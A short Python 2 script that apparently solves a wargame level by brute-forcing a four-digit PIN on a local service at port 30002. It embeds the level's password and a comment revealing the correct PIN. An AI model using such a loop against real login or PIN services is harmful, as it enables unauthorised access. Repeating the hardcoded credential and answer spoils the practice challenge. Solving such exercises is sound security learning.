import socket, sys

def read_line(s):
    a = ""
    while 1:
        b = s.recv(1)
        if b != "\n":
            a = a + b
        else:
            break
    return a

try:
    try:
        for i in range(0,9999):
            s = socket.socket()
            s.connect(('localhost', 30002))
            s.recv(1024)
            s.send('UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ ' + str(i) + '\n')
            result = read_line(s)
            pin = "%04d" % (i,)
            if result == 'Wrong! Please enter the correct pincode. Try again.':
                print '\rTrying PIN:',
                print pin,
                sys.stdout.flush()
            else:
                # The correct is 2263
                print('\n\nCorrect pin => ' + pin)
                print(result)
                print(s.recv(1024))
                sys.exit(0)
            s.close()
    except socket.error:
        print("Socket disconnected")
except KeyboardInterrupt:
    print("Bye")
    sys.exit(0)
